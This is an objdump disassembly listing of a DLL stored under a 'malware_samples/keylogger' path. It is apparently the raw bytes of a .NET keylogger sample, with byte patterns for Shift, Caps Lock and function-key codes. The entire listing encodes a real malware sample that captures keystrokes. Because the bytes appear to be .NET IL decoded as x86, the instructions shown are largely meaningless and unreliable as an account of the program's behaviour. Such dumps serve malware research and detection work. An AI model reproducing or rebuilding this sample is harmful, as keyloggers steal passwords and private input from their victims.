
malware_samples/keylogger/0991a28ed2869bfa2df4be72aa190422a5c26bac19e77d79fd1bfe6d01fdcc79.dll:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	d0 ab 00 00 00 00    	shrb   $1,0x0(%ebx)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 58 87 00    	add    %al,0x875800
  402013:	00 24 24             	add    %ah,(%esp)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	00 00                	add    %al,(%eax)
  40201e:	00 00                	add    %al,(%eax)
  402020:	58                   	pop    %eax
  402021:	2d 00 00 00 5a       	sub    $0x5a000000,%eax
	...
  40204e:	00 00                	add    %al,(%eax)
  402050:	1a 28                	sbb    (%eax),%ch
  402052:	50                   	push   %eax
  402053:	00 00                	add    %al,(%eax)
  402055:	06                   	push   %es
  402056:	2a 86 14 fe 06 06    	sub    0x606fe14(%esi),%al
  40205c:	00 00                	add    %al,(%eax)
  40205e:	06                   	push   %es
  40205f:	73 01                	jae    0x402062
  402061:	00 00                	add    %al,(%eax)
  402063:	0a 73 02             	or     0x2(%ebx),%dh
  402066:	00 00                	add    %al,(%eax)
  402068:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  40206e:	73 03                	jae    0x402073
  402070:	00 00                	add    %al,(%eax)
  402072:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  402078:	2a 00                	sub    (%eax),%al
  40207a:	00 00                	add    %al,(%eax)
  40207c:	1b 30                	sbb    (%eax),%esi
  40207e:	02 00                	add    (%eax),%al
  402080:	22 00                	and    (%eax),%al
  402082:	00 00                	add    %al,(%eax)
  402084:	00 00                	add    %al,(%eax)
  402086:	00 00                	add    %al,(%eax)
  402088:	7e 07                	jle    0x402091
  40208a:	00 00                	add    %al,(%eax)
  40208c:	04 7e                	add    $0x7e,%al
  40208e:	04 00                	add    $0x0,%al
  402090:	00 0a                	add    %cl,(%edx)
  402092:	28 05 00 00 0a 2c    	sub    %al,0x2c0a0000
  402098:	0b 7e 07             	or     0x7(%esi),%edi
  40209b:	00 00                	add    %al,(%eax)
  40209d:	04 28                	add    $0x28,%al
  40209f:	0b 00                	or     (%eax),%eax
  4020a1:	00 06                	add    %al,(%esi)
  4020a3:	26 de 03             	fiadds %es:(%ebx)
  4020a6:	26 de 00             	fiadds %es:(%eax)
  4020a9:	2a 00                	sub    (%eax),%al
  4020ab:	00 01                	add    %al,(%ecx)
  4020ad:	10 00                	adc    %al,(%eax)
  4020af:	00 00                	add    %al,(%eax)
  4020b1:	00 00                	add    %al,(%eax)
  4020b3:	00 1e                	add    %bl,(%esi)
  4020b5:	1e                   	push   %ds
  4020b6:	00 03                	add    %al,(%ebx)
  4020b8:	01 00                	add    %eax,(%eax)
  4020ba:	00 01                	add    %al,(%ecx)
  4020bc:	2e 7e 02             	jle,pn 0x4020c1
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 6f                	add    $0x6f,%al
  4020c3:	06                   	push   %es
  4020c4:	00 00                	add    %al,(%eax)
  4020c6:	0a 2a                	or     (%edx),%ch
  4020c8:	ce                   	into
  4020c9:	14 fe                	adc    $0xfe,%al
  4020cb:	06                   	push   %es
  4020cc:	09 00                	or     %eax,(%eax)
  4020ce:	00 06                	add    %al,(%esi)
  4020d0:	73 16                	jae    0x4020e8
  4020d2:	00 00                	add    %al,(%eax)
  4020d4:	06                   	push   %es
  4020d5:	80 08 00             	orb    $0x0,(%eax)
  4020d8:	00 04 1f             	add    %al,(%edi,%ebx,1)
  4020db:	0d 7e 08 00 00       	or     $0x87e,%eax
  4020e0:	04 28                	add    $0x28,%al
  4020e2:	07                   	pop    %es
  4020e3:	00 00                	add    %al,(%eax)
  4020e5:	0a 6f 08             	or     0x8(%edi),%ch
  4020e8:	00 00                	add    %al,(%eax)
  4020ea:	0a 6f 09             	or     0x9(%edi),%ch
  4020ed:	00 00                	add    %al,(%eax)
  4020ef:	0a 16                	or     (%esi),%dl
  4020f1:	28 11                	sub    %dl,(%ecx)
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	06                   	push   %es
  4020f6:	80 07 00             	addb   $0x0,(%edi)
  4020f9:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4020fc:	1b 30                	sbb    (%eax),%esi
  4020fe:	01 00                	add    %eax,(%eax)
  402100:	10 00                	adc    %al,(%eax)
  402102:	00 00                	add    %al,(%eax)
  402104:	00 00                	add    %al,(%eax)
  402106:	00 00                	add    %al,(%eax)
  402108:	28 05 00 00 06 28    	sub    %al,0x28060000
  40210e:	0a 00                	or     (%eax),%al
  402110:	00 0a                	add    %cl,(%edx)
  402112:	de 03                	fiadds (%ebx)
  402114:	26 de 00             	fiadds %es:(%eax)
  402117:	2a 01                	sub    (%ecx),%al
  402119:	10 00                	adc    %al,(%eax)
  40211b:	00 00                	add    %al,(%eax)
  40211d:	00 00                	add    %al,(%eax)
  40211f:	00 0c 0c             	add    %cl,(%esp,%ecx,1)
  402122:	00 03                	add    %al,(%ebx)
  402124:	01 00                	add    %eax,(%eax)
  402126:	00 01                	add    %al,(%ecx)
  402128:	1b 30                	sbb    (%eax),%esi
  40212a:	03 00                	add    (%eax),%eax
  40212c:	47                   	inc    %edi
  40212d:	00 00                	add    %al,(%eax)
  40212f:	00 01                	add    %al,(%ecx)
  402131:	00 00                	add    %al,(%eax)
  402133:	11 20                	adc    %esp,(%eax)
  402135:	00 01                	add    %al,(%ecx)
  402137:	00 00                	add    %al,(%eax)
  402139:	73 0b                	jae    0x402146
  40213b:	00 00                	add    %al,(%eax)
  40213d:	0a 0a                	or     (%edx),%cl
  40213f:	28 12                	sub    %dl,(%edx)
  402141:	00 00                	add    %al,(%eax)
  402143:	06                   	push   %es
  402144:	25 12 01 28 13       	and    $0x13280112,%eax
  402149:	00 00                	add    %al,(%eax)
  40214b:	06                   	push   %es
  40214c:	26 06                	es push %es
  40214e:	20 00                	and    %al,(%eax)
  402150:	01 00                	add    %eax,(%eax)
  402152:	00 28                	add    %ch,(%eax)
  402154:	15 00 00 06 16       	adc    $0x16060000,%eax
  402159:	31 13                	xor    %edx,(%ebx)
  40215b:	06                   	push   %es
  40215c:	6f                   	outsl  %ds:(%esi),(%dx)
  40215d:	0c 00                	or     $0x0,%al
  40215f:	00 0a                	add    %cl,(%edx)
  402161:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  402165:	04 7e                	add    $0x7e,%al
  402167:	04 00                	add    $0x0,%al
  402169:	00 04 0c             	add    %al,(%esp,%ecx,1)
  40216c:	de 0b                	fimuls (%ebx)
  40216e:	de 03                	fiadds (%ebx)
  402170:	26 de 00             	fiadds %es:(%eax)
  402173:	72 01                	jb     0x402176
  402175:	00 00                	add    %al,(%eax)
  402177:	70 2a                	jo     0x4021a3
  402179:	08 2a                	or     %ch,(%edx)
  40217b:	00 01                	add    %al,(%ecx)
  40217d:	10 00                	adc    %al,(%eax)
  40217f:	00 00                	add    %al,(%eax)
  402181:	00 00                	add    %al,(%eax)
  402183:	00 3c 3c             	add    %bh,(%esp,%edi,1)
  402186:	00 03                	add    %al,(%ebx)
  402188:	09 00                	or     %eax,(%eax)
  40218a:	00 01                	add    %al,(%ecx)
  40218c:	1b 30                	sbb    (%eax),%esi
  40218e:	07                   	pop    %es
  40218f:	00 6a 00             	add    %ch,0x0(%edx)
  402192:	00 00                	add    %al,(%eax)
  402194:	02 00                	add    (%eax),%al
  402196:	00 11                	add    %dl,(%ecx)
  402198:	73 03                	jae    0x40219d
  40219a:	00 00                	add    %al,(%eax)
  40219c:	0a 0a                	or     (%edx),%cl
  40219e:	20 00                	and    %al,(%eax)
  4021a0:	01 00                	add    %eax,(%eax)
  4021a2:	00 8d 0b 00 00 01    	add    %cl,0x100000b(%ebp)
  4021a8:	0b 07                	or     (%edi),%eax
  4021aa:	28 0e                	sub    %cl,(%esi)
  4021ac:	00 00                	add    %al,(%eax)
  4021ae:	06                   	push   %es
  4021af:	2d 09 72 09 00       	sub    $0x97209,%eax
  4021b4:	00 70 13             	add    %dh,0x13(%eax)
  4021b7:	05 de 45 02 16       	add    $0x160245de,%eax
  4021bc:	28 10                	sub    %dl,(%eax)
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	06                   	push   %es
  4021c1:	0c 28                	or     $0x28,%al
  4021c3:	12 00                	adc    (%eax),%al
  4021c5:	00 06                	add    %al,(%esi)
  4021c7:	12 04 28             	adc    (%eax,%ebp,1),%al
  4021ca:	13 00                	adc    (%eax),%eax
  4021cc:	00 06                	add    %al,(%esi)
  4021ce:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4021d1:	00 06                	add    %al,(%esi)
  4021d3:	0d 02 08 07 06       	or     $0x6070802,%eax
  4021d8:	1b 16                	sbb    (%esi),%edx
  4021da:	09 28                	or     %ebp,(%eax)
  4021dc:	0f 00 00             	sldt   (%eax)
  4021df:	06                   	push   %es
  4021e0:	26 06                	es push %es
  4021e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e3:	0c 00                	or     $0x0,%al
  4021e5:	00 0a                	add    %cl,(%edx)
  4021e7:	13 05 de 14 26 de    	adc    0xde2614de,%eax
  4021ed:	00 02                	add    %al,(%edx)
  4021ef:	13 06                	adc    (%esi),%eax
  4021f1:	12 06                	adc    (%esi),%al
  4021f3:	fe                   	(bad)
  4021f4:	16                   	push   %ss
  4021f5:	0a 00                	or     (%eax),%al
  4021f7:	00 01                	add    %al,(%ecx)
  4021f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021fa:	0c 00                	or     $0x0,%al
  4021fc:	00 0a                	add    %cl,(%edx)
  4021fe:	2a 11                	sub    (%ecx),%dl
  402200:	05 2a 00 00 01       	add    $0x100002a,%eax
  402205:	10 00                	adc    %al,(%eax)
  402207:	00 00                	add    %al,(%eax)
  402209:	00 00                	add    %al,(%eax)
  40220b:	00 53 53             	add    %dl,0x53(%ebx)
  40220e:	00 03                	add    %al,(%ebx)
  402210:	01 00                	add    %eax,(%eax)
  402212:	00 01                	add    %al,(%ecx)
  402214:	1b 30                	sbb    (%eax),%esi
  402216:	05 00 d9 02 00       	add    $0x2d900,%eax
  40221b:	00 03                	add    %al,(%ebx)
  40221d:	00 00                	add    %al,(%eax)
  40221f:	11 02                	adc    %eax,(%edx)
  402221:	16                   	push   %ss
  402222:	3f                   	aas
  402223:	c7 01 00 00 03 20    	movl   $0x20030000,(%ecx)
  402229:	00 01                	add    %al,(%ecx)
  40222b:	00 00                	add    %al,(%eax)
  40222d:	28 0d 00 00 0a 28    	sub    %cl,0x280a0000
  402233:	0e                   	push   %cs
  402234:	00 00                	add    %al,(%eax)
  402236:	0a 39                	or     (%ecx),%bh
  402238:	b2 01                	mov    $0x1,%dl
  40223a:	00 00                	add    %al,(%eax)
  40223c:	04 28                	add    $0x28,%al
  40223e:	0f 00 00             	sldt   (%eax)
  402241:	0a 0a                	or     (%edx),%cl
  402243:	1f                   	pop    %ds
  402244:	14 28                	adc    $0x28,%al
  402246:	14 00                	adc    $0x0,%al
  402248:	00 06                	add    %al,(%esi)
  40224a:	20 ff                	and    %bh,%bh
  40224c:	ff 00                	incl   (%eax)
  40224e:	00 5f 16             	add    %bl,0x16(%edi)
  402251:	fe 03                	incb   (%ebx)
  402253:	20 a0 00 00 00 28    	and    %ah,0x28000000(%eax)
  402259:	14 00                	adc    $0x0,%al
  40225b:	00 06                	add    %al,(%esi)
  40225d:	20 00                	and    %al,(%eax)
  40225f:	80 00 00             	addb   $0x0,(%eax)
  402262:	5f                   	pop    %edi
  402263:	2d 15 20 a1 00       	sub    $0xa12015,%eax
  402268:	00 00                	add    %al,(%eax)
  40226a:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40226d:	00 06                	add    %al,(%esi)
  40226f:	20 00                	and    %al,(%eax)
  402271:	80 00 00             	addb   $0x0,(%eax)
  402274:	5f                   	pop    %edi
  402275:	16                   	push   %ss
  402276:	fe 03                	incb   (%ebx)
  402278:	2b 01                	sub    (%ecx),%eax
  40227a:	17                   	pop    %ss
  40227b:	0b 06                	or     (%esi),%eax
  40227d:	28 08                	sub    %cl,(%eax)
  40227f:	00 00                	add    %al,(%eax)
  402281:	06                   	push   %es
  402282:	0c 07                	or     $0x7,%al
  402284:	60                   	pusha
  402285:	2c 09                	sub    $0x9,%al
  402287:	08 6f 10             	or     %ch,0x10(%edi)
  40228a:	00 00                	add    %al,(%eax)
  40228c:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  40228f:	07                   	pop    %es
  402290:	08 6f 11             	or     %ch,0x11(%edi)
  402293:	00 00                	add    %al,(%eax)
  402295:	0a 0c 06             	or     (%esi,%eax,1),%cl
  402298:	1f                   	pop    %ds
  402299:	70 32                	jo     0x4022cd
  40229b:	29 06                	sub    %eax,(%esi)
  40229d:	20 87 00 00 00 30    	and    %al,0x30000000(%edi)
  4022a3:	21 72 0b             	and    %esi,0xb(%edx)
  4022a6:	00 00                	add    %al,(%eax)
  4022a8:	70 06                	jo     0x4022b0
  4022aa:	0d 12 03 fe 16       	or     $0x16fe0312,%eax
  4022af:	0a 00                	or     (%eax),%al
  4022b1:	00 01                	add    %al,(%ecx)
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	0c 00                	or     $0x0,%al
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	72 0f                	jb     0x4022c9
  4022ba:	00 00                	add    %al,(%eax)
  4022bc:	70 28                	jo     0x4022e6
  4022be:	12 00                	adc    (%eax),%al
  4022c0:	00 0a                	add    %cl,(%edx)
  4022c2:	0c 2b                	or     $0x2b,%al
  4022c4:	7f 06                	jg     0x4022cc
  4022c6:	0d 12 03 fe 16       	or     $0x16fe0312,%eax
  4022cb:	0a 00                	or     (%eax),%al
  4022cd:	00 01                	add    %al,(%ecx)
  4022cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4022d0:	0c 00                	or     $0x0,%al
  4022d2:	00 0a                	add    %cl,(%edx)
  4022d4:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4022d7:	04 72                	add    $0x72,%al
  4022d9:	13 00                	adc    (%eax),%eax
  4022db:	00 70 28             	add    %dh,0x28(%eax)
  4022de:	13 00                	adc    (%eax),%eax
  4022e0:	00 0a                	add    %cl,(%edx)
  4022e2:	2d 3a 11 04 72       	sub    $0x7204113a,%eax
  4022e7:	1f                   	pop    %ds
  4022e8:	00 00                	add    %al,(%eax)
  4022ea:	70 28                	jo     0x402314
  4022ec:	13 00                	adc    (%eax),%eax
  4022ee:	00 0a                	add    %cl,(%edx)
  4022f0:	2d 34 11 04 72       	sub    $0x72041134,%eax
  4022f5:	2d 00 00 70 28       	sub    $0x28700000,%eax
  4022fa:	13 00                	adc    (%eax),%eax
  4022fc:	00 0a                	add    %cl,(%edx)
  4022fe:	2d 2e 11 04 72       	sub    $0x7204112e,%eax
  402303:	3b 00                	cmp    (%eax),%eax
  402305:	00 70 28             	add    %dh,0x28(%eax)
  402308:	13 00                	adc    (%eax),%eax
  40230a:	00 0a                	add    %cl,(%edx)
  40230c:	2d 28 11 04 72       	sub    $0x72041128,%eax
  402311:	45                   	inc    %ebp
  402312:	00 00                	add    %al,(%eax)
  402314:	70 28                	jo     0x40233e
  402316:	13 00                	adc    (%eax),%eax
  402318:	00 0a                	add    %cl,(%edx)
  40231a:	2d 22 2b 26 72       	sub    $0x72262b22,%eax
  40231f:	4d                   	dec    %ebp
  402320:	00 00                	add    %al,(%eax)
  402322:	70 0c                	jo     0x402330
  402324:	2b 1e                	sub    (%esi),%ebx
  402326:	72 51                	jb     0x402379
  402328:	00 00                	add    %al,(%eax)
  40232a:	70 0c                	jo     0x402338
  40232c:	2b 16                	sub    (%esi),%edx
  40232e:	72 63                	jb     0x402393
  402330:	00 00                	add    %al,(%eax)
  402332:	70 0c                	jo     0x402340
  402334:	2b 0e                	sub    (%esi),%ecx
  402336:	72 71                	jb     0x4023a9
  402338:	00 00                	add    %al,(%eax)
  40233a:	70 0c                	jo     0x402348
  40233c:	2b 06                	sub    (%esi),%eax
  40233e:	72 7f                	jb     0x4023bf
  402340:	00 00                	add    %al,(%eax)
  402342:	70 0c                	jo     0x402350
  402344:	08 28                	or     %ch,(%eax)
  402346:	14 00                	adc    $0x0,%al
  402348:	00 0a                	add    %cl,(%edx)
  40234a:	3a 8c 01 00 00 73 03 	cmp    0x3730000(%ecx,%eax,1),%cl
  402351:	00 00                	add    %al,(%eax)
  402353:	0a 13                	or     (%ebx),%dl
  402355:	05 7e 04 00 00       	add    $0x47e,%eax
  40235a:	04 28                	add    $0x28,%al
  40235c:	07                   	pop    %es
  40235d:	00 00                	add    %al,(%eax)
  40235f:	06                   	push   %es
  402360:	28 13                	sub    %dl,(%ebx)
  402362:	00 00                	add    %al,(%eax)
  402364:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  402367:	11 05 08 6f 15 00    	adc    %eax,0x156f08
  40236d:	00 0a                	add    %cl,(%edx)
  40236f:	26 2b 57 11          	sub    %es:0x11(%edi),%edx
  402373:	05 1b 8d 0e 00       	add    $0xe8d1b,%eax
  402378:	00 01                	add    %al,(%ecx)
  40237a:	25 16 72 8d 00       	and    $0x8d7216,%eax
  40237f:	00 70 a2             	add    %dh,-0x5e(%eax)
  402382:	25 17 28 16 00       	and    $0x162817,%eax
  402387:	00 0a                	add    %cl,(%edx)
  402389:	13 06                	adc    (%esi),%eax
  40238b:	12 06                	adc    (%esi),%al
  40238d:	28 17                	sub    %dl,(%edi)
  40238f:	00 00                	add    %al,(%eax)
  402391:	0a a2 25 18 72 95    	or     -0x6a8de7db(%edx),%ah
  402397:	00 00                	add    %al,(%eax)
  402399:	70 a2                	jo     0x40233d
  40239b:	25 19 28 07 00       	and    $0x72819,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	a2 25 1a 72 0f       	mov    %al,0xf721a25
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	70 a2                	jo     0x40234d
  4023ab:	28 18                	sub    %bl,(%eax)
  4023ad:	00 00                	add    %al,(%eax)
  4023af:	0a 6f 15             	or     0x15(%edi),%ch
  4023b2:	00 00                	add    %al,(%eax)
  4023b4:	0a 26                	or     (%esi),%ah
  4023b6:	11 05 72 9d 00 00    	adc    %eax,0x9d72
  4023bc:	70 08                	jo     0x4023c6
  4023be:	28 19                	sub    %bl,(%ecx)
  4023c0:	00 00                	add    %al,(%eax)
  4023c2:	0a 6f 15             	or     0x15(%edi),%ch
  4023c5:	00 00                	add    %al,(%eax)
  4023c7:	0a 26                	or     (%esi),%ah
  4023c9:	7e 19                	jle    0x4023e4
  4023cb:	00 00                	add    %al,(%eax)
  4023cd:	04 11                	add    $0x11,%al
  4023cf:	05 6f 0c 00 00       	add    $0xc6f,%eax
  4023d4:	0a 7e 1b             	or     0x1b(%esi),%bh
  4023d7:	00 00                	add    %al,(%eax)
  4023d9:	04 7e                	add    $0x7e,%al
  4023db:	1c 00                	sbb    $0x0,%al
  4023dd:	00 04 73             	add    %al,(%ebx,%esi,2)
  4023e0:	1a 00                	sbb    (%eax),%al
  4023e2:	00 0a                	add    %cl,(%edx)
  4023e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4023e5:	32 00                	xor    (%eax),%al
  4023e7:	00 06                	add    %al,(%esi)
  4023e9:	38 ed                	cmp    %ch,%ch
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	00 02                	add    %al,(%edx)
  4023ef:	16                   	push   %ss
  4023f0:	3f                   	aas
  4023f1:	e6 00                	out    %al,$0x0
  4023f3:	00 00                	add    %al,(%eax)
  4023f5:	03 20                	add    (%eax),%esp
  4023f7:	04 01                	add    $0x1,%al
  4023f9:	00 00                	add    %al,(%eax)
  4023fb:	28 0d 00 00 0a 28    	sub    %cl,0x280a0000
  402401:	0e                   	push   %cs
  402402:	00 00                	add    %al,(%eax)
  402404:	0a 39                	or     (%ecx),%bh
  402406:	d1 00                	roll   $1,(%eax)
  402408:	00 00                	add    %al,(%eax)
  40240a:	04 28                	add    $0x28,%al
  40240c:	0f 00 00             	sldt   (%eax)
  40240f:	0a 13                	or     (%ebx),%dl
  402411:	07                   	pop    %es
  402412:	20 a5 00 00 00 28    	and    %ah,0x28000000(%ebp)
  402418:	14 00                	adc    $0x0,%al
  40241a:	00 06                	add    %al,(%esi)
  40241c:	20 00                	and    %al,(%eax)
  40241e:	80 00 00             	addb   $0x0,(%eax)
  402421:	5f                   	pop    %edi
  402422:	16                   	push   %ss
  402423:	fe 03                	incb   (%ebx)
  402425:	11 07                	adc    %eax,(%edi)
  402427:	28 08                	sub    %cl,(%eax)
  402429:	00 00                	add    %al,(%eax)
  40242b:	06                   	push   %es
  40242c:	13 08                	adc    (%eax),%ecx
  40242e:	39 a8 00 00 00 11    	cmp    %ebp,0x11000000(%eax)
  402434:	08 28                	or     %ch,(%eax)
  402436:	14 00                	adc    $0x0,%al
  402438:	00 0a                	add    %cl,(%edx)
  40243a:	3a 9c 00 00 00 73 03 	cmp    0x3730000(%eax,%eax,1),%bl
  402441:	00 00                	add    %al,(%eax)
  402443:	0a 13                	or     (%ebx),%dl
  402445:	09 7e 04             	or     %edi,0x4(%esi)
  402448:	00 00                	add    %al,(%eax)
  40244a:	04 28                	add    $0x28,%al
  40244c:	07                   	pop    %es
  40244d:	00 00                	add    %al,(%eax)
  40244f:	06                   	push   %es
  402450:	28 13                	sub    %dl,(%ebx)
  402452:	00 00                	add    %al,(%eax)
  402454:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  402457:	11 09                	adc    %ecx,(%ecx)
  402459:	11 08                	adc    %ecx,(%eax)
  40245b:	6f                   	outsl  %ds:(%esi),(%dx)
  40245c:	15 00 00 0a 26       	adc    $0x260a0000,%eax
  402461:	2b 58 11             	sub    0x11(%eax),%ebx
  402464:	09 1b                	or     %ebx,(%ebx)
  402466:	8d 0e                	lea    (%esi),%ecx
  402468:	00 00                	add    %al,(%eax)
  40246a:	01 25 16 72 8d 00    	add    %esp,0x8d7216
  402470:	00 70 a2             	add    %dh,-0x5e(%eax)
  402473:	25 17 28 16 00       	and    $0x162817,%eax
  402478:	00 0a                	add    %cl,(%edx)
  40247a:	13 06                	adc    (%esi),%eax
  40247c:	12 06                	adc    (%esi),%al
  40247e:	28 17                	sub    %dl,(%edi)
  402480:	00 00                	add    %al,(%eax)
  402482:	0a a2 25 18 72 95    	or     -0x6a8de7db(%edx),%ah
  402488:	00 00                	add    %al,(%eax)
  40248a:	70 a2                	jo     0x40242e
  40248c:	25 19 28 07 00       	and    $0x72819,%eax
  402491:	00 06                	add    %al,(%esi)
  402493:	a2 25 1a 72 0f       	mov    %al,0xf721a25
  402498:	00 00                	add    %al,(%eax)
  40249a:	70 a2                	jo     0x40243e
  40249c:	28 18                	sub    %bl,(%eax)
  40249e:	00 00                	add    %al,(%eax)
  4024a0:	0a 6f 15             	or     0x15(%edi),%ch
  4024a3:	00 00                	add    %al,(%eax)
  4024a5:	0a 26                	or     (%esi),%ah
  4024a7:	11 09                	adc    %ecx,(%ecx)
  4024a9:	72 9d                	jb     0x402448
  4024ab:	00 00                	add    %al,(%eax)
  4024ad:	70 11                	jo     0x4024c0
  4024af:	08 28                	or     %ch,(%eax)
  4024b1:	19 00                	sbb    %eax,(%eax)
  4024b3:	00 0a                	add    %cl,(%edx)
  4024b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4024b6:	15 00 00 0a 26       	adc    $0x260a0000,%eax
  4024bb:	7e 19                	jle    0x4024d6
  4024bd:	00 00                	add    %al,(%eax)
  4024bf:	04 11                	add    $0x11,%al
  4024c1:	09 6f 0c             	or     %ebp,0xc(%edi)
  4024c4:	00 00                	add    %al,(%eax)
  4024c6:	0a 7e 1b             	or     0x1b(%esi),%bh
  4024c9:	00 00                	add    %al,(%eax)
  4024cb:	04 7e                	add    $0x7e,%al
  4024cd:	1c 00                	sbb    $0x0,%al
  4024cf:	00 04 73             	add    %al,(%ebx,%esi,2)
  4024d2:	1a 00                	sbb    (%eax),%al
  4024d4:	00 0a                	add    %cl,(%edx)
  4024d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4024d7:	32 00                	xor    (%eax),%al
  4024d9:	00 06                	add    %al,(%esi)
  4024db:	7e 07                	jle    0x4024e4
  4024dd:	00 00                	add    %al,(%eax)
  4024df:	04 02                	add    $0x2,%al
  4024e1:	03 04 28             	add    (%eax,%ebp,1),%eax
  4024e4:	0d 00 00 06 13       	or     $0x13060000,%eax
  4024e9:	0a de                	or     %dh,%bl
  4024eb:	0a 26                	or     (%esi),%ah
  4024ed:	7e 04                	jle    0x4024f3
  4024ef:	00 00                	add    %al,(%eax)
  4024f1:	0a 13                	or     (%ebx),%dl
  4024f3:	0a de                	or     %dh,%bl
  4024f5:	00 11                	add    %dl,(%ecx)
  4024f7:	0a 2a                	or     (%edx),%ch
  4024f9:	00 00                	add    %al,(%eax)
  4024fb:	00 41 1c             	add    %al,0x1c(%ecx)
	...
  402506:	00 00                	add    %al,(%eax)
  402508:	cc                   	int3
  402509:	02 00                	add    (%eax),%al
  40250b:	00 cc                	add    %cl,%ah
  40250d:	02 00                	add    (%eax),%al
  40250f:	00 0a                	add    %cl,(%edx)
  402511:	00 00                	add    %al,(%eax)
  402513:	00 01                	add    %al,(%ecx)
  402515:	00 00                	add    %al,(%eax)
  402517:	01 1e                	add    %ebx,(%esi)
  402519:	02 28                	add    (%eax),%ch
  40251b:	1b 00                	sbb    (%eax),%eax
  40251d:	00 0a                	add    %cl,(%edx)
  40251f:	2a 1e                	sub    (%esi),%bl
  402521:	02 7b 0e             	add    0xe(%ebx),%bh
  402524:	00 00                	add    %al,(%eax)
  402526:	04 2a                	add    $0x2a,%al
  402528:	22 02                	and    (%edx),%al
  40252a:	03 7d 0e             	add    0xe(%ebp),%edi
  40252d:	00 00                	add    %al,(%eax)
  40252f:	04 2a                	add    $0x2a,%al
  402531:	1e                   	push   %ds
  402532:	02 7b 0f             	add    0xf(%ebx),%bh
  402535:	00 00                	add    %al,(%eax)
  402537:	04 2a                	add    $0x2a,%al
  402539:	22 02                	and    (%edx),%al
  40253b:	03 7d 0f             	add    0xf(%ebp),%edi
  40253e:	00 00                	add    %al,(%eax)
  402540:	04 2a                	add    $0x2a,%al
  402542:	1e                   	push   %ds
  402543:	02 7b 10             	add    0x10(%ebx),%bh
  402546:	00 00                	add    %al,(%eax)
  402548:	04 2a                	add    $0x2a,%al
  40254a:	22 02                	and    (%edx),%al
  40254c:	03 7d 10             	add    0x10(%ebp),%edi
  40254f:	00 00                	add    %al,(%eax)
  402551:	04 2a                	add    $0x2a,%al
  402553:	1e                   	push   %ds
  402554:	02 7b 11             	add    0x11(%ebx),%bh
  402557:	00 00                	add    %al,(%eax)
  402559:	04 2a                	add    $0x2a,%al
  40255b:	22 02                	and    (%edx),%al
  40255d:	03 7d 11             	add    0x11(%ebp),%edi
  402560:	00 00                	add    %al,(%eax)
  402562:	04 2a                	add    $0x2a,%al
  402564:	1e                   	push   %ds
  402565:	02 7b 12             	add    0x12(%ebx),%bh
  402568:	00 00                	add    %al,(%eax)
  40256a:	04 2a                	add    $0x2a,%al
  40256c:	22 02                	and    (%edx),%al
  40256e:	03 7d 12             	add    0x12(%ebp),%edi
  402571:	00 00                	add    %al,(%eax)
  402573:	04 2a                	add    $0x2a,%al
  402575:	1e                   	push   %ds
  402576:	02 7b 13             	add    0x13(%ebx),%bh
  402579:	00 00                	add    %al,(%eax)
  40257b:	04 2a                	add    $0x2a,%al
  40257d:	22 02                	and    (%edx),%al
  40257f:	03 7d 13             	add    0x13(%ebp),%edi
  402582:	00 00                	add    %al,(%eax)
  402584:	04 2a                	add    $0x2a,%al
  402586:	1e                   	push   %ds
  402587:	02 7b 14             	add    0x14(%ebx),%bh
  40258a:	00 00                	add    %al,(%eax)
  40258c:	04 2a                	add    $0x2a,%al
  40258e:	22 02                	and    (%edx),%al
  402590:	03 7d 14             	add    0x14(%ebp),%edi
  402593:	00 00                	add    %al,(%eax)
  402595:	04 2a                	add    $0x2a,%al
  402597:	00 13                	add    %dl,(%ebx)
  402599:	30 03                	xor    %al,(%ebx)
  40259b:	00 52 00             	add    %dl,0x0(%edx)
  40259e:	00 00                	add    %al,(%eax)
  4025a0:	00 00                	add    %al,(%eax)
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	02 28                	add    (%eax),%ch
  4025a6:	1b 00                	sbb    (%eax),%eax
  4025a8:	00 0a                	add    %cl,(%edx)
  4025aa:	02 16                	add    (%esi),%dl
  4025ac:	28 27                	sub    %ah,(%edi)
  4025ae:	00 00                	add    %al,(%eax)
  4025b0:	06                   	push   %es
  4025b1:	02 03                	add    (%ebx),%al
  4025b3:	28 1b                	sub    %bl,(%ebx)
  4025b5:	00 00                	add    %al,(%eax)
  4025b7:	06                   	push   %es
  4025b8:	02 04 28             	add    (%eax,%ebp,1),%al
  4025bb:	25 00 00 06 02       	and    $0x2060000,%eax
  4025c0:	02 fe                	add    %dh,%bh
  4025c2:	06                   	push   %es
  4025c3:	33 00                	xor    (%eax),%eax
  4025c5:	00 06                	add    %al,(%esi)
  4025c7:	73 3a                	jae    0x402603
  4025c9:	00 00                	add    %al,(%eax)
  4025cb:	06                   	push   %es
  4025cc:	7d 16                	jge    0x4025e4
  4025ce:	00 00                	add    %al,(%eax)
  4025d0:	04 02                	add    $0x2,%al
  4025d2:	02 fe                	add    %dh,%bh
  4025d4:	06                   	push   %es
  4025d5:	2d 00 00 06 73       	sub    $0x73060000,%eax
